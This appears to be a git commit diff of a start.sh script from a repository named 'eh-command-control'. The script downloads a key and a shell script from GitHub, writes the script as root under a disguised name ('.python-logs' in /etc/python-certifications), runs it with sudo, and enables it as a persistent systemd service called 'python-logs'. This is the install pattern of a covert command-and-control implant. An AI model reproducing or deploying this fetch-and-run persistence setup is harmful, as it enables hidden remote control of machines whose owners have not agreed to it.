5e12a8bc5bd45386de4898115dc9bb5861f13a76
AidanNgo <115433593+AidanNgo@users.noreply.github.com>
2026-03-26 21:24:36 -0500

    Update start.sh

--- start.sh
+++ start.sh
@@ -9,13 +9,13 @@ curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/hea
 curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/key.pem -o key.pem
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
-  | sudo tee /etc/.python-certifications/.python-logs > /dev/null
+  | sudo tee /etc/python-certifications/.python-logs > /dev/null
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
   | sudo tee /etc/systemd/system/python-logs.service > /dev/null
 
-sudo chmod +x /etc/.python-certifications/.python-logs
-sudo bash /etc/.python-certifications/.python-logs
+sudo chmod +x /etc/python-certifications/.python-logs
+sudo bash /etc/python-certifications/.python-logs
 
 sudo systemctl daemon-reload
 sudo systemctl enable python-logs
